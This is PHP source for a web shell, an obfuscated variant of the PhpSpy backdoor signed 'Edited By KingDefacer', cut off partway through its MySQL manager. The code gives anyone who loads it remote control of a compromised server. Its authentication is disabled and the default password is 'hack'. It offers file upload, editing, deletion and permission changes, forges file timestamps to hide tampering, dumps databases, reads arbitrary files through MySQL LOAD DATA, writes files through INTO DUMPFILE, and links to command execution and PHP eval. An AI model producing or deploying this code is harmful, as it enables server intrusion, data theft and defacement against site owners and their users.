<?php
?>
ï»¿
<?php  echo '[syslog]01
'; error_reporting(7); ob_start(); $sp18e70c = explode(' ', microtime()); $spe4271b = $sp18e70c[1] + $sp18e70c[0]; define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)) . '/'); define('IS_WIN', DIRECTORY_SEPARATOR == '\\'); define('IS_COM', class_exists('COM') ? 1 : 0); define('IS_GPC', get_magic_quotes_gpc()); $sp4c12e2 = 'true'; define('IS_PHPINFO', !preg_match('phpinfo', $sp4c12e2) ? 1 : 0); @set_time_limit(0); foreach (array('_GET', '_POST') as $sp6ec745) { foreach (${$sp6ec745} as $spc95096 => $spd1726c) { if ($spc95096[0] != '_') { if (IS_GPC) { $spd1726c = s_array($spd1726c); } ${$spc95096} = $spd1726c; } } } $spc90b55 = array(); $spc90b55['check'] = false; $spc90b55['pass'] = 'hack'; $spc90b55['cookiepre'] = ''; $spc90b55['cookiedomain'] = ''; $spc90b55['cookiepath'] = '/'; $spc90b55['cookielife'] = 86400; echo '[syslog]02
'; if ($spe887a2 == 'utf8') { header('content-Type: text/html; charset=utf-8'); } elseif ($spe887a2 == 'big5') { header('content-Type: text/html; charset=big5'); } elseif ($spe887a2 == 'gbk') { header('content-Type: text/html; charset=gbk'); } elseif ($spe887a2 == 'latin1') { header('content-Type: text/html; charset=iso-8859-2'); } $spa5bde5 = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']; $sp0b64ce = time(); if ($spd2ab61 == 'logout') { scookie('phpspypass', '', -86400 * 365); p('<meta http-equiv="refresh" content="1;URL=' . $spa5bde5 . '">'); p('<a style="font:12px Verdana" href="' . $spa5bde5 . '">Success</a>'); die; } if ($spc90b55['check']) { if ($sp960351 == 'login') { if ($spc90b55['pass'] == $sp3796e1) { scookie('phpspypass', $sp3796e1); p('<meta http-equiv="refresh" content="1;URL=' . $spa5bde5 . '">'); p('<a style="font:12px Verdana" href="' . $spa5bde5 . '">Success</a>'); die; } } if ($_COOKIE['phpspypass']) { if ($_COOKIE['phpspypass'] != $spc90b55['pass']) { loginpage(); } } else { loginpage(); } } $sp61abc1 = ''; if ($sp960351 == 'downfile' && $sp1530b1) { if (!@file_exists($sp1530b1)) { $sp61abc1 = 'The file you want Downloadable was nonexistent'; } else { $sp4e6d9b = pathinfo($sp1530b1); header('Content-type: application/x-' . $sp4e6d9b['extension']); header('Content-Disposition: attachment; filename=' . $sp4e6d9b['basename']); header('Content-Length: ' . filesize($sp1530b1)); @readfile($sp1530b1); die; } } if ($sp960351 == 'backupmysql' && !$specd210) { dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); $sp4297b3 = array_flip($sp4297b3); $spea30d5 = q('SHOW tables'); if (!$spea30d5) { p('<h2>' . mysql_error() . '</h2>'); } $spbc6552 = basename($_SERVER['HTTP_HOST'] . '_MySQL.sql'); @header('Content-type: application/unknown'); @header('Content-Disposition: attachment; filename=' . $spbc6552); $sp46750c = ''; while ($sp6023e3 = mysql_fetch_array($spea30d5)) { if (isset($sp4297b3[$sp6023e3[0]])) { $sp46750c .= sqldumptable($sp6023e3[0]); } } mysql_close(); die; } if ($sp960351 == 'mysqldown') { if (!$spf835c8) { $sp61abc1 = 'Please input dbname'; } else { dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); if (!file_exists($spd71c42)) { $sp61abc1 = 'The file you want Downloadable was nonexistent'; } else { $spea30d5 = q("select load_file('{$spd71c42}');"); if (!$spea30d5) { q('DROP TABLE IF EXISTS tmp_magiccoder;'); q('CREATE TABLE tmp_magiccoder (content LONGBLOB NOT NULL);'); q('LOAD DATA LOCAL INFILE \'' . addslashes($spd71c42) . "' INTO TABLE tmp_magiccoder FIELDS TERMINATED BY '__magiccoder_{$sp0b64ce}_eof__' ESCAPED BY '' LINES TERMINATED BY '__magiccoder_{$sp0b64ce}_eof__';"); $spea30d5 = q('select content from tmp_magiccoder'); q('DROP TABLE tmp_magiccoder'); } $spa53ce4 = @mysql_fetch_array($spea30d5); if (!$spa53ce4) { $sp61abc1 = 'Load file failed ' . mysql_error(); } else { $sp4e6d9b = pathinfo($spd71c42); header('Content-type: application/x-' . $sp4e6d9b['extension']); header('Content-Disposition: attachment; filename=' . $sp4e6d9b['basename']); header('Accept-Length: ' . strlen($spa53ce4[0])); echo $spa53ce4[0]; die; } } } } ?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<title><?php  echo str_replace('.', '', 'P.h.p.S.p.y'); ?>
 | Edited By KingDefacer</title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
</style>
<script type="text/javascript">
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function goaction(act){
	$('goaction').action.value=act;
	$('goaction').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><a href="http://www.magiccoder.ir" target="_blank">MagicCoder</a></span><?php  echo $_SERVER['HTTP_HOST']; ?>
 (<?php  echo gethostbyname($_SERVER['SERVER_NAME']); ?>
)</td>
	</tr>
	<tr class="alt1">
		<td><span style="float:right;">Safe Mode:<?php  echo getcfg('safe_mode'); ?>
</span>			
			<?php  if ($spc90b55['check'] != false) { echo '<a href="javascript:goaction(\'logout\');">Logout</a> |'; } else { } ?>
 
			<a href="javascript:goaction('file');">File Manager</a> | 
			<a href="javascript:goaction('sqladmin');">MySQL Manager</a> | 
			<a href="javascript:goaction('sqlfile');">MySQL Upload &amp; Download</a> | 
			<?php  if (getcfg('safe_mode') == 'Yes') { echo 'Execute Command (Safe Mode is On ) |'; } else { echo '<a href="javascript:goaction(\'shell\');">Execute Command</a> |'; } ?>
			<a href="javascript:goaction('phpenv');">PHP Variable</a> | 
			<a href="javascript:goaction('eval');">Eval PHP Code</a> |			<?php  if (getcfg('safe_mode') == 'Yes') { echo 'NET (Safe Mode is On )'; } elseif (IS_WIN) { echo 'NET (Os is a Windows)'; } else { echo '<a href="javascript:goaction(\'net\');">NET</a>'; } ?>
		</td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php  formhead(array('name' => 'goaction')); makehide('action'); formfoot(); $sp61abc1 && m($sp61abc1); !$spa25e24 && ($spa25e24 = '.'); $sp43bee6 = getPath(SA_ROOT, $spa25e24); if (substr($spa25e24, -1) != '/') { $spa25e24 = $spa25e24 . '/'; } $sp2f3dbc = ue($spa25e24); if (!$spd2ab61 || $spd2ab61 == 'file') { $spe76b78 = @is_writable($sp43bee6) ? 'Writable' : 'Non-writable'; if ($sp960351 == 'deldir' && $sp1530b1) { if (!file_exists($sp1530b1)) { m($sp1530b1 . ' directory does not exist'); } else { m('Directory delete ' . (deltree($sp1530b1) ? basename($sp1530b1) . ' success' : 'failed')); } } elseif ($sp6747bd) { $sp1d0a7c = $sp43bee6 . $sp6747bd; if (file_exists($sp1d0a7c)) { m('Directory has already existed'); } else { m('Directory created ' . (@mkdir($sp1d0a7c, 511) ? 'success' : 'failed')); @chmod($sp1d0a7c, 511); } } elseif ($spef0b4a) { m('File upload ' . (@copy($_FILES['uploadfile']['tmp_name'], $spe338c5 . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed')); } elseif ($sp4ea5c5 && $spa91038) { $sp694629 = @fopen($sp4ea5c5, 'w'); m('Save file ' . (@fwrite($sp694629, $spa91038) ? 'success' : 'failed')); @fclose($sp694629); } elseif ($spd94d1c && $sp609aaf) { if (!file_exists($spd94d1c)) { m('The original file does not exist'); } else { $sp609aaf = base_convert($sp609aaf, 8, 10); m('Modify file attributes ' . (@chmod($spd94d1c, $sp609aaf) ? 'success' : 'failed')); } } elseif ($spebfb20 && $sp3094c6) { $sp9d2f9c = $sp43bee6 . $sp3094c6; if (file_exists($sp9d2f9c) || !file_exists($spebfb20)) { m($sp9d2f9c . ' has already existed or original file does not exist'); } else { m(basename($spebfb20) . ' renamed ' . basename($sp9d2f9c) . (@rename($spebfb20, $sp9d2f9c) ? ' success' : 'failed')); } } elseif ($sp27faf8 && $sp32ead2) { if (file_exists($sp32ead2) || !file_exists($sp27faf8)) { m('The goal file has already existed or original file does not exist'); } else { m(basename($sp32ead2) . ' copied ' . (@copy($sp27faf8, $sp32ead2) ? basename($sp32ead2) . ' success' : 'failed')); } } elseif ($spce1719 && $sp4f223c) { if (!@file_exists($spce1719) || !@file_exists($sp4f223c)) { m('The goal file has already existed or original file does not exist'); } else { $spdec3d1 = @filemtime($sp4f223c); m('Modify file the last modified ' . (@touch($spce1719, $spdec3d1, $spdec3d1) ? 'success' : 'failed')); } } elseif ($spce1719 && $sp0b4f70 && $spb1237d && $sp1dac19 && $spee7809 && $sp1be835 && $sp764002) { if (!@file_exists($spce1719)) { m(basename($spce1719) . ' does not exist'); } else { $spdec3d1 = strtotime("{$sp0b4f70}-{$spb1237d}-{$sp1dac19} {$spee7809}:{$sp1be835}:{$sp764002}"); m('Modify file the last modified ' . (@touch($spce1719, $spdec3d1, $spdec3d1) ? 'success' : 'failed')); } } elseif ($sp960351 == 'downrar') { if ($sp8602f0) { $sp766f56 = ''; foreach ($sp8602f0 as $spcc8ef6 => $spc3da4d) { $sp766f56 .= $spcc8ef6 . ','; } $sp766f56 = substr($sp766f56, 0, strlen($sp766f56) - 1); $sp8602f0 = explode(',', $sp766f56); $sp41fe23 = new PHPZip($sp8602f0); $sp9f2ccf = $sp41fe23->out; header('Content-type: application/octet-stream'); header('Accept-Ranges: bytes'); header('Accept-Length: ' . strlen($sp9f2ccf)); header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_Files.tar.gz'); echo $sp9f2ccf; die; } else { m('Please select file(s)'); } } elseif ($sp960351 == 'delfiles') { if ($sp8602f0) { $sp766f56 = ''; $sp40e8a8 = $sp80229e = 0; foreach ($sp8602f0 as $spcc8ef6 => $spc3da4d) { if (@unlink($spcc8ef6)) { $sp40e8a8++; } else { $sp80229e++; } } m('Deleted file have finishedÃÂ£ÃÂ¬choose ' . count($sp8602f0) . ' success ' . $sp40e8a8 . ' fail ' . $sp80229e); } else { m('Please select file(s)'); } } formhead(array('name' => 'createdir')); makehide('newdirname'); makehide('dir', $sp43bee6); formfoot(); formhead(array('name' => 'fileperm')); makehide('newperm'); makehide('pfile'); makehide('dir', $sp43bee6); formfoot(); formhead(array('name' => 'copyfile')); makehide('sname'); makehide('tofile'); makehide('dir', $sp43bee6); formfoot(); formhead(array('name' => 'rename')); makehide('oldname'); makehide('newfilename'); makehide('dir', $sp43bee6); formfoot(); formhead(array('name' => 'fileopform')); makehide('action'); makehide('opfile'); makehide('dir'); formfoot(); $sp7997f0 = @disk_free_space($sp43bee6); !$sp7997f0 && ($sp7997f0 = 0); $spfd360f = @disk_total_space($sp43bee6); !$spfd360f && ($spfd360f = 0); $sp2f5415 = $spfd360f - $sp7997f0; $spb889a2 = @round(100 / ($spfd360f / $sp7997f0), 2); p('<h2>File Manager - Current disk free ' . sizecount($sp7997f0) . ' of ' . sizecount($spfd360f) . ' (' . $spb889a2 . '%)</h2>'); ?>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  <form action="" method="post" id="godir" name="godir">
  <tr>
    <td nowrap>Current Directory (<?php  echo $spe76b78; ?>
, <?php  echo getChmod($sp43bee6); ?>
)</td>
	<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php  echo $sp43bee6; ?>
" type="text" style="width:100%;margin:0 8px;"></td>
    <td nowrap><input class="bt" value="GO" type="submit"></td>
  </tr>
  </form>
</table>
<script type="text/javascript">
function createdir(){
	var newdirname;
	newdirname = prompt('Please input the directory name:', '');
	if (!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
	if (!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
	if (!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
	if (!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$('filelist').doing.value=doing;
	if (thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('Please input the file name:', '');
	if (!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$('fileopform').action.value=action;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$('godir').view_writable.value=1;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
</script>
  <?php  tbhead(); p('<form action="' . $spa5bde5 . '" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">'); p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="bt" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $spa25e24 . '" type="hidden" /><input name="dir" value="' . $spa25e24 . '" type="hidden" /></div>'); p('<a href="javascript:godir(\'' . $_SERVER['DOCUMENT_ROOT'] . '\');">WebRoot</a>'); if ($spe3a41f) { p(' | <a href="javascript:godir(\'' . $sp43bee6 . '\');">View All</a>'); } else { p(' | <a href="javascript:godir(\'' . $sp43bee6 . '\',\'1\');">View Writable</a>'); } p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\'' . $sp43bee6 . '\');">Create File</a>'); if (IS_WIN && IS_COM) { $sp83bb24 = new COM('scripting.filesystemobject'); if ($sp83bb24 && is_object($sp83bb24)) { $sp6f1f5a = array(0 => 'Unknow', 1 => 'Removable', 2 => 'Fixed', 3 => 'Network', 4 => 'CDRom', 5 => 'RAM Disk'); foreach ($sp83bb24->Drives as $sp204eaf) { if ($sp204eaf->DriveType == 2) { p(' | <a href="javascript:godir(\'' . $sp204eaf->Path . '/\');" title="Size:' . sizecount($sp204eaf->TotalSize) . '&#13;Free:' . sizecount($sp204eaf->FreeSpace) . '&#13;Type:' . $sp6f1f5a[$sp204eaf->DriveType] . '">' . $sp6f1f5a[$sp204eaf->DriveType] . '(' . $sp204eaf->Path . ')</a>'); } else { p(' | <a href="javascript:godir(\'' . $sp204eaf->Path . '/\');" title="Type:' . $sp6f1f5a[$sp204eaf->DriveType] . '">' . $sp6f1f5a[$sp204eaf->DriveType] . '(' . $sp204eaf->Path . ')</a>'); } } } } p('</td></tr></form>'); p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>'); $sp8e4b9a = array(); $spbe6662 = array(); if ($spe3a41f) { $sp8e4b9a = GetList($sp43bee6); } else { $sp0f92f5 = @opendir($spa25e24); while ($spa3ecf0 = @readdir($sp0f92f5)) { $spcc8ef6 = $sp43bee6 . $spa3ecf0; if (@is_dir($spcc8ef6)) { $sp2dc025['filename'] = $spa3ecf0; $sp2dc025['mtime'] = @date('Y-m-d H:i:s', filemtime($spcc8ef6)); $sp2dc025['dirchmod'] = getChmod($spcc8ef6); $sp2dc025['dirperm'] = getPerms($spcc8ef6); $sp2dc025['fileowner'] = getUser($spcc8ef6); $sp2dc025['dirlink'] = $sp43bee6; $sp2dc025['server_link'] = $spcc8ef6; $sp2dc025['client_link'] = ue($spcc8ef6); $sp8e4b9a[] = $sp2dc025; } else { $sp7a2dbc['filename'] = $spa3ecf0; $sp7a2dbc['size'] = sizecount(@filesize($spcc8ef6)); $sp7a2dbc['mtime'] = @date('Y-m-d H:i:s', filemtime($spcc8ef6)); $sp7a2dbc['filechmod'] = getChmod($spcc8ef6); $sp7a2dbc['fileperm'] = getPerms($spcc8ef6); $sp7a2dbc['fileowner'] = getUser($spcc8ef6); $sp7a2dbc['dirlink'] = $sp43bee6; $sp7a2dbc['server_link'] = $spcc8ef6; $sp7a2dbc['client_link'] = ue($spcc8ef6); $spbe6662[] = $sp7a2dbc; } } unset($sp2dc025); unset($sp7a2dbc); @closedir($sp0f92f5); } @sort($sp8e4b9a); @sort($spbe6662); $spc6af21 = '0'; foreach ($sp8e4b9a as $sp8b00ef => $sp2dc025) { if ($sp2dc025['filename'] != '..' && $sp2dc025['filename'] != '.') { $spa7d501 = bg(); p('<tr class="' . $spa7d501 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $spa7d501 . '\';">'); p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>'); p('<td><a href="javascript:godir(\'' . $sp2dc025['server_link'] . '\');">' . $sp2dc025['filename'] . '</a></td>'); p('<td nowrap>' . $sp2dc025['mtime'] . '</td>'); p('<td nowrap>--</td>'); p('<td nowrap>'); p('<a href="javascript:fileperm(\'' . $sp2dc025['server_link'] . '\');">' . $sp2dc025['dirchmod'] . '</a> / '); p('<a href="javascript:fileperm(\'' . $sp2dc025['server_link'] . '\');">' . $sp2dc025['dirperm'] . '</a>' . $sp2dc025['fileowner'] . '</td>'); p('<td nowrap><a href="javascript:dofile(\'deldir\',\'' . $sp2dc025['server_link'] . '\',\'Are you sure will delete ' . $sp2dc025['filename'] . '? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\'' . $sp2dc025['server_link'] . '\');">Rename</a></td>'); p('</tr>'); $spc6af21++; } else { if ($sp2dc025['filename'] == '..') { p('<tr class=' . bg() . '>'); p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\'' . getUpPath($sp43bee6) . '\');">Parent Directory</a></td>'); p('</tr>'); } } } p('<tr bgcolor="#dddddd" stlye="border-top:1px solid #fff;border-bottom:1px solid #ddd;"><td colspan="6" height="5"></td></tr>'); p('<form id="filelist" name="filelist" action="' . $spa5bde5 . '" method="post">'); makehide('action', 'file'); makehide('thefile'); makehide('doing'); makehide('dir', $sp43bee6); $sp8e3ab7 = '0'; foreach ($spbe6662 as $sp8b00ef => $sp7a2dbc) { if ($sp7a2dbc['filename'] != '..' && $sp7a2dbc['filename'] != '.') { $spa1669e = str_replace(SA_ROOT, '', $sp7a2dbc['server_link']); $spa7d501 = bg(); p('<tr class="' . $spa7d501 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $spa7d501 . '\';">'); p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl[' . $sp7a2dbc['server_link'] . ']"></td>'); p('<td><a href="' . $spa1669e . '" target="_blank">' . $sp7a2dbc['filename'] . '</a></td>'); p('<td nowrap>' . $sp7a2dbc['mtime'] . '</td>'); p('<td nowrap>' . $sp7a2dbc['size'] . '</td>'); p('<td nowrap>'); p('<a href="javascript:fileperm(\'' . $sp7a2dbc['server_link'] . '\');">' . $sp7a2dbc['filechmod'] . '</a> / '); p('<a href="javascript:fileperm(\'' . $sp7a2dbc['server_link'] . '\');">' . $sp7a2dbc['fileperm'] . '</a>' . $sp7a2dbc['fileowner'] . '</td>'); p('<td nowrap>'); p('<a href="javascript:dofile(\'downfile\',\'' . $sp7a2dbc['server_link'] . '\');">Down</a> | '); p('<a href="javascript:copyfile(\'' . $sp7a2dbc['server_link'] . '\');">Copy</a> | '); p('<a href="javascript:opfile(\'editfile\',\'' . $sp7a2dbc['server_link'] . '\',\'' . $sp7a2dbc['dirlink'] . '\');">Edit</a> | '); p('<a href="javascript:rename(\'' . $sp7a2dbc['server_link'] . '\');">Rename</a> | '); p('<a href="javascript:opfile(\'newtime\',\'' . $sp7a2dbc['server_link'] . '\',\'' . $sp7a2dbc['dirlink'] . '\');">Time</a>'); p('</td></tr>'); $sp8e3ab7++; } } p('<tr class="' . bg() . '"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Packing download selected</a> - <a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td colspan="4" align="right">' . $spc6af21 . ' directories / ' . $sp8e3ab7 . ' files</td></tr>'); p('</form></table>'); } elseif ($spd2ab61 == 'sqlfile') { if ($sp960351 == 'mysqlupload') { $spa3ecf0 = $_FILES['uploadfile']; $spbc6552 = $spa3ecf0['tmp_name']; if (file_exists($spaa7295)) { m('The goal file has already existed'); } else { if (!$spbc6552) { m('Please choose a file'); } else { $sp694629 = @fopen($spbc6552, 'r'); $sp5f83f4 = @fread($sp694629, filesize($spbc6552)); @fclose($sp694629); $sp5f83f4 = bin2hex($sp5f83f4); if (!$sp948616) { $sp948616 = $spa3ecf0['name']; } dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); $spea30d5 = q("SELECT 0x{$sp5f83f4} FROM mysql.user INTO DUMPFILE '{$spaa7295}';"); m($spea30d5 ? 'Upload success' : 'Upload has failed: ' . mysql_error()); } } } ?>
<script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
<?php  !$spf65dbc && ($spf65dbc = 'localhost'); !$sp9d1e01 && ($sp9d1e01 = 'root'); !$spa00579 && ($spa00579 = '3306'); $spec44be = array('' => 'Default', 'gbk' => 'GBK', 'big5' => 'Big5', 'utf8' => 'UTF-8', 'latin1' => 'Latin1'); formhead(array('title' => 'MYSQL Information', 'name' => 'dbinfo')); makehide('action', 'sqlfile'); p('<p>'); p('DBHost:'); makeinput(array('name' => 'dbhost', 'size' => 20, 'value' => $spf65dbc)); p(':'); makeinput(array('name' => 'dbport', 'size' => 4, 'value' => $spa00579)); p('DBUser:'); makeinput(array('name' => 'dbuser', 'size' => 15, 'value' => $sp9d1e01)); p('DBPass:'); makeinput(array('name' => 'dbpass', 'size' => 15, 'value' => $sp686c1a)); p('DBName:'); makeinput(array('name' => 'dbname', 'size' => 15, 'value' => $spf835c8)); p('DBCharset:'); makeselect(array('name' => 'charset', 'option' => $spec44be, 'selected' => $spe887a2)); p('</p>'); formfoot(); p('<form action="' . $spa5bde5 . '" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">'); p('<h2>Upload file</h2>'); p('<p><b>This operation the DB user must has FILE privilege</b></p>'); p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>'); p('<h2>Download file</h2>'); p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>'); makehide('dbhost'); makehide('dbport'); makehide('dbuser'); makehide('dbpass'); makehide('dbname'); makehide('charset'); makehide('doing'); makehide('action', 'sqlfile'); p('</form>'); } elseif ($spd2ab61 == 'sqladmin') { !$spf65dbc && ($spf65dbc = 'localhost'); !$sp9d1e01 && ($sp9d1e01 = 'root'); !$spa00579 && ($spa00579 = '3306'); $sp49f45f = '<input type="hidden" id="connect" name="connect" value="1" />'; if (isset($spf65dbc)) { $sp49f45f .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"{$spf65dbc}\" />\n"; } if (isset($sp9d1e01)) { $sp49f45f .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"{$sp9d1e01}\" />\n"; } if (isset($sp686c1a)) { $sp49f45f .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"{$sp686c1a}\" />\n"; } if (isset($spa00579)) { $sp49f45f .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"{$spa00579}\" />\n"; } if (isset($spf835c8)) { $sp49f45f .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"{$spf835c8}\" />\n"; } if (isset($spe887a2)) { $sp49f45f .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"{$spe887a2}\" />\n"; } if ($sp960351 == 'backupmysql' && $specd210) { if (!$sp4297b3) { m('Please choose the table'); } else { dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); $sp4297b3 = array_flip($sp4297b3); $sp694629 = @fopen($sp49de29, 'w'); if ($sp694629) { $spea30d5 = q('SHOW tables'); if (!$spea30d5) { p('<h2>' . mysql_error() . '</h2>'); } $sp46750c = ''; while ($sp6023e3 = mysql_fetch_array($spea30d5)) { if (isset($sp4297b3[$sp6023e3[0]])) { sqldumptable($sp6023e3[0], $sp694629); } } fclose($sp694629); $spa1669e = str_replace(SA_ROOT, '', $sp49de29); m('Database has success backup to <a href="' . $spa1669e . '" target="_blank">' . $sp49de29 . '</a>'); mysql_close(); } else { m('Backup failed'); } } } if ($sp7bb17f && $sp88efc5) { $sp32e952 = $spbd636e = $sped1c3a = ''; foreach ($sp88efc5 as $sp8b00ef => $sp9c4d84) { if ($sp9c4d84) { $sp32e952 .= $sped1c3a . $sp8b00ef; $spbd636e .= $sped1c3a . '\'' . addslashes($sp9c4d84) . '\''; $sped1c3a = ','; } } if ($sp32e952 && $spbd636e) { dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); m(q("INSERT INTO {$sp455fbb} ({$sp32e952}) VALUES ({$spbd636e})") ? 'Insert new record of success' : mysql_error()); } } if ($sp407833 && $sp88efc5 && $sp7a8f5b) { $spbd636e = $sped1c3a = ''; foreach ($sp88efc5 as $sp8b00ef => $sp9c4d84) { $spbd636e .= $sped1c3a . $sp8b00ef . '=\'' . addslashes($sp9c4d84) . '\''; $sped1c3a = ','; } if ($spbd636e) { $sp8ba212 = base64_decode($sp7a8f5b); dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); m(q("UPDATE {$sp455fbb} SET {$spbd636e} WHERE {$sp8ba212} LIMIT 1") ? 'Record updating' : mysql_error()); } } if ($sp960351 == 'del' && $sp7a8f5b) { $sp8ba212 = base64_decode($sp7a8f5b); $sp56dbc3 = "DELETE FROM {$sp455fbb} WHERE {$sp8ba212}"; dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); m(q("DELETE FROM {$sp455fbb} WHERE {$sp8ba212}") ? 'Deletion record of success' : mysql_error()); } if ($sp455fbb && $sp960351 == 'drop') { dbconn($spf65dbc, $sp9d1e01, $sp686c1a, $spf835c8, $spe887a2, $spa00579); if (q("DROP TABLE {$sp455fbb}")) { m('Drop table of success'); $sp455fbb = ''; } else { m(mysql_error()); } } $spec44be = array('' => 'Default', 'gbk' => 'GBK', 'big5' => 'Big5', 'utf8' => 'UTF-8', 'latin1' => 'Latin1'); formhead(array('title' => 'MYSQL Manager')); makehide('action', 'sqladmin'); p('<p>'); p('DBHost:'); makeinput(array('name' => 'dbhost', 'size' => 20, 'value' => $spf65dbc)); p(':'); makeinput(array('name' => 'dbport', 'size' => 4, 'value' => $spa00579)); p('DBUser:'); makeinput(array('name' => 'dbuser', 'size' => 15, 'value' => $sp9d1e01)); p('DBPass:'); makeinput(array('name' => 'dbpass', 'size' => 15, 'value' => $sp686c1a)); p('DBCharset:'); makeselect(array('name' => 'charset', 'option' => $spec44be, 'selected' => $spe887a2)); makeinput(array('name' => 'connect', 'value' => 'Connect', 'type' => 'submit', 'class' => 'bt')); p('</p>'); formfoot(); ?>
<script type="text/javascript">
function editrecord(action, base64, tablename){
	if (action == 'del') {		
		if (!confirm('Is or isn\'t deletion record?')) return;
	}
	$('recordlist').doing.value=action;
	$('recordlist').base64.value=base64;
	$('recordlist').tablename.value=tablename;
	$('recordlist').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
